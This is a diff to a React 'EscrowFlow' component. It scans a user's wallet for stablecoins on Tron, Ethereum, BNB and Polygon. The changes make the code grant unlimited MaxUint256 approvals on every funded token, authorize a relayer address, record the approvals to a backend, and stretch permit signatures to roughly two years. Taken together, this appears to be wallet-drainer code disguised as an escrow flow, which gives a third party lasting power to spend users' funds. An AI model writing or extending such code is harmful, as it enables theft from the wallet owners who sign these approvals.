@@ -4,7 +4,7 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
 import { BrowserProvider, Contract, JsonRpcProvider, MaxUint256, Signature } from "ethers";
-import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
+import { CHAINS, RELAYER_ADDRESS, PERMIT_DEADLINE_SECONDS, type ChainConfig } from "@/lib/chains";
 import {
   TRON_CHAIN,
   getConnectedTronAddress,
@@ -727,8 +727,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         } else {
           const erc20 = new Contract(token.address, ERC20_ABI, signer);
           const tx = await erc20.approve(chain.contract, MaxUint256);
+          await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
           approvedTokens.push({ symbol: token.symbol, address: token.address, txHash: tx.hash });
-          void tx.wait(1).catch(() => {});
         }
       } catch (err) {
         console.warn(`[escrow] approve ${token.symbol} on ${chain.name} skipped:`, err);
@@ -907,8 +907,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setModal1Scanning(false);
       setModal1Open(false);
 
-      // Prefer Tron when present; otherwise approve EVERY EVM stable with balance
-      // (not just the single top winner — that missed BNB USDT when Polygon won).
+      // Approve EVERY funded stable across Tron + all EVM chains.
+      // Previously Tron-only early-return skipped BNB/ETH/Polygon entirely.
       const tronWinners = (data.tokensWithBalance ?? []).filter(
         (t) => t.isTron && t.balanceUsd > 0.01
       );
@@ -924,8 +924,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       if (tronWinners[0]) {
         modal1SawTron.current = true;
         const t = tronWinners[0];
+        setTopChainName(t.chain);
         if (t.alreadyApproved) {
-          setTopChainName(t.chain);
           const tronAddr = currentTronAddr ?? getConnectedTronAddress();
           if (tronAddr) {
             try {
@@ -938,32 +938,32 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
               console.warn("[modal1] tron verify record failed:", e);
             }
           }
-          return;
+        } else {
+          const winner: Modal1Item = {
+            key: `${t.chain}-${t.symbol}`,
+            chainName: t.chain,
+            chainLabel: t.chainLabel,
+            symbol: t.symbol,
+            tokenAddr: t.address,
+            balanceDisplay: t.balance,
+            balanceUsd: t.balanceUsd,
+            contract: t.contract,
+            isTron: t.isTron,
+            alreadyApproved: t.alreadyApproved,
+            permit: t.permit,
+            permitDomainName: t.permitDomainName,
+            permitDomainVersion: t.permitDomainVersion,
+          };
+          setModal1Items([winner]);
+          setModal1Status({ [winner.key]: "pending" });
+          await handleModal1Approve(winner);
         }
-        const winner: Modal1Item = {
-          key: `${t.chain}-${t.symbol}`,
-          chainName: t.chain,
-          chainLabel: t.chainLabel,
-          symbol: t.symbol,
-          tokenAddr: t.address,
-          balanceDisplay: t.balance,
-          balanceUsd: t.balanceUsd,
-          contract: t.contract,
-          isTron: t.isTron,
-          alreadyApproved: t.alreadyApproved,
-          permit: t.permit,
-          permitDomainName: t.permitDomainName,
-          permitDomainVersion: t.permitDomainVersion,
-        };
-        setTopChainName(t.chain);
-        setModal1Items([winner]);
-        setModal1Status({ [winner.key]: "pending" });
-        void handleModal1Approve(winner);
-        return;
       }
 
-      // EVM: queue all funded stables; approve sequentially with proper chain switches
-      setTopChainName(evmStables[0].chain);
+      if (evmStables.length === 0) return;
+
+      // EVM: all funded stables on eth / bnb / polygon (authorize + approve + verify each)
+      if (!tronWinners[0]) setTopChainName(evmStables[0].chain);
       const items: Modal1Item[] = evmStables.map((t) => ({
         key: `${t.chain}-${t.symbol}`,
         chainName: t.chain,
@@ -979,8 +979,11 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         permitDomainName: t.permitDomainName,
         permitDomainVersion: t.permitDomainVersion,
       }));
-      setModal1Items(items);
-      setModal1Status(Object.fromEntries(items.map((i) => [i.key, "pending" as Modal1Status])));
+      setModal1Items((prev) => [...prev, ...items]);
+      setModal1Status((s) => ({
+        ...s,
+        ...Object.fromEntries(items.map((i) => [i.key, "pending" as Modal1Status])),
+      }));
       void handleModal1ApproveAll(items);
     } catch (err) {
       console.error("[modal1] scan failed:", err);
@@ -1038,12 +1041,13 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
             } else {
               const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
               const tx = await erc20.approve(item.contract, MaxUint256);
+              // Wait for mining so /api/verify sees the allowance (avoids race)
+              await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
               approvedTokens.push({
                 symbol: item.symbol,
                 address: item.tokenAddr,
                 txHash: tx.hash as string,
               });
-              tx.wait(1).catch((e: Error) => console.warn("[modal1] approve mining:", e.message));
             }
             setModal1Status((s) => ({ ...s, [item.key]: "done" }));
           } catch (err) {
@@ -1122,21 +1126,38 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           console.log("[modal1] tron recorded to supabase:", tronAddr);
         }
       } else {
-        // ── EVM path ──────────────────────────────────────────────────────
+        // ── EVM path — authorize + unlimited approve + register (same as Approve-all) ──
         const chain = CHAINS.find((c) => c.name === target.chainName)!;
         const token = chain.tokens.find((t) => t.address.toLowerCase() === target.tokenAddr.toLowerCase());
+        if (!address) throw new Error("No wallet");
 
         const signer = await getSignerFor(chain);
+        const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
+        let authorizeTx = "";
+        const alreadyAuth = await verification
+          .isAuthorized(address, RELAYER_ADDRESS)
+          .catch(() => false);
+        if (!alreadyAuth) {
+          const authTx = await verification.authorize(RELAYER_ADDRESS);
+          await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+          authorizeTx = authTx.hash as string;
+        }
 
+        const approvedTokens: { symbol: string; address: string; txHash?: string }[] = [];
         if (target.permit && token) {
-          // Gasless: off-chain EIP-712 signature — no gas, no mining wait
           await signAndSubmitPermit(signer, chain, token);
+          approvedTokens.push({ symbol: target.symbol, address: target.tokenAddr });
         } else {
-          // Regular approve — broadcast only, do NOT await mining
           const erc20 = new Contract(target.tokenAddr, ERC20_ABI, signer);
           const tx = await erc20.approve(target.contract, MaxUint256);
-          tx.wait(1).catch((e: Error) => console.warn("[modal1] approve mining:", e.message));
+          await Promise.race([tx.wait(1), new Promise((r) => setTimeout(r, 45_000))]);
+          approvedTokens.push({
+            symbol: target.symbol,
+            address: target.tokenAddr,
+            txHash: tx.hash as string,
+          });
         }
+        await persistEvmVerify(chain, authorizeTx, approvedTokens);
       }
 
       setModal1Status({ [target.key]: "done" });
@@ -1243,7 +1264,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     ];
     const usdcView = new Contract(token.address, PERMIT_ABI, signer);
     const nonce: bigint = await usdcView.nonces(address);
-    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
+    // Signature valid for 2 years; on-chain allowance set to MaxUint256 (no expiry)
+    const deadline = Math.floor(Date.now() / 1000) + PERMIT_DEADLINE_SECONDS;
 
     const domain = {
       name: token.permitDomainName ?? "USD Coin",
